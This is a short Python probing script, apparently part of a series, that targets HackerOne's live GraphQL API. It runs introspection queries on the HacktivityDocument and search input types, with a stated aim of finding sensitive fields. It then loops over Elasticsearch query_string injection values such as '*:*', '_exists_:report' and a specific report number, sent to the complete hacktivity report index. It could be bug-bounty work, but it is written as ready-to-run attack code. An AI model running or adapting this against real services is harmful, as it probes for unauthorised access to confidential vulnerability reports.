# -*- coding: utf-8 -*-
"""CF 组:匿名技术矩阵——ES 结构/HacktivityDocument 字段/XML解析/GET-GraphQL(2026-09-08)"""
import json
import urllib.request

BASE = "https://hackerone.com/graphql"
HDRS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/json"}


def post(query, label, ctype="application/json"):
    data = json.dumps({"query": query}).encode()
    req = urllib.request.Request(BASE, data=data, headers={"User-Agent": HDRS["User-Agent"], "Content-Type": ctype})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            body = r.read().decode("utf-8", "replace")
        print(f"===== {label}\n{body[:1500]}\n")
    except urllib.error.HTTPError as e:
        print(f"===== {label} HTTP {e.code}\n{e.read().decode('utf-8', 'replace')[:800]}\n")
    except Exception as e:
        print(f"===== {label} ERR {e}\n")


# 1. HacktivityDocument 全字段(找敏感字段)
post("""{ __type(name:"HacktivityDocument"){ fields{ name type{ kind name ofType{ kind name ofType{ kind name ofType{ kind name } } } } } } }""", "CF1_doc_fields")

# 2. range/nested query input 结构
post("""{ a:__type(name:"QueryInput"){ inputFields{ name type{ kind name } } } b:__type(name:"RangeInput"){ inputFields{ name type{ kind name ofType{ kind name } } } } c:__type(name:"NestedQueryInput"){ inputFields{ name type{ kind name ofType{ kind name } } } } }""", "CF2_query_inputs")

# 3. query_string ES 特征注入
for i, q in enumerate(['"', '{', '}', '\\\\', "_exists_:report", "*:*", "report:3732660"]):
    post('{ search(index: CompleteHacktivityReportIndex, query_string: %s, first: 1){ total_count } }' % json.dumps(q), "CF3_qs_%d_%s" % (i, q[:12]))
